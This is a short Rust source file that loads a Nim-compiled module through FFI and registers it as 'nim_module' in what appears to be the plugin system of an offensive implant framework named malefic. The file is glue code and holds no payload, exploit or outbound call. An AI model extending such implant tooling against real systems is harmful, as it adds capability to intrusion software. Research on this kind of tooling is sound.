use malefic_module::prelude::*;
use malefic_module::ffi::*;
use std::ffi::{c_char, c_int, c_uint};

extern "C" {
    fn NimMain();
    fn NimModuleName() -> *const c_char;
    fn NimModuleHandle(
        task_id: c_uint,
        req_data: *const c_char,
        req_len: c_int,
        resp_data: *mut *mut c_char,
        resp_len: *mut c_int,
    ) -> c_int;
}

static NIM_INIT: std::sync::Once = std::sync::Once::new();

pub struct NimModule {
    name: String,
}

impl NimModule {
    fn init() -> Self {
        NIM_INIT.call_once(|| unsafe { NimMain() });
        let name = unsafe { ffi_module_name(NimModuleName, false) };
        Self { name }
    }
}

#[async_trait]
impl Module for NimModule {
    fn name() -> &'static str
    where
        Self: Sized,
    {
        "nim_module"
    }

    fn new() -> Self
    where
        Self: Sized,
    {
        NimModule::init()
    }

    fn new_instance(&self) -> Box<MaleficModule> {
        Box::new(NimModule {
            name: self.name.clone(),
        })
    }
}

#[async_trait]
impl ModuleImpl for NimModule {
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut Input,
        sender: &mut Output,
    ) -> ModuleResult {
        ffi_run_loop(id, receiver, sender, NimModuleHandle, "NimModuleHandle").await
    }
}

pub fn register(map: &mut MaleficBundle) {
    let module = NimModule::init();
    map.insert(module.name.clone(), Box::new(module));
}
